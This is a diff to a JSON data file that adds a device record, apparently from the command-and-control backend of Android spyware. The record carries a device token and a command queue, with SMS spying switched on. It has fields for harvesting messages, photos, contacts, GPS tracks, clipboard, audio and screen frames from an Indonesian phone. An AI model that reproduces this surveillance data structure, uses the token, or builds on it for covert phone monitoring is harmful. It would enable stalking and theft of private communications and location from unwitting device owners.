@@ -3586,5 +3586,37 @@
       "frameId": 1694,
       "capturedAt": 1776089414723
     }
+  },
+  {
+    "deviceId": "pxc_26ad11f0",
+    "deviceName": "HP-LOCK-236E",
+    "ownerUsername": "Riz99",
+    "token": "e01857cd155ffe2390412502b9f10ddc",
+    "lastSeen": 1776095298759,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-13T15:48:18.759Z",
+    "deviceInfo": {
+      "model": "vivo V2344",
+      "androidVersion": "Android 14",
+      "battery": 19,
+      "network": "WiFi: <unknown ssid>",
+      "sim1": "Telkomsel",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
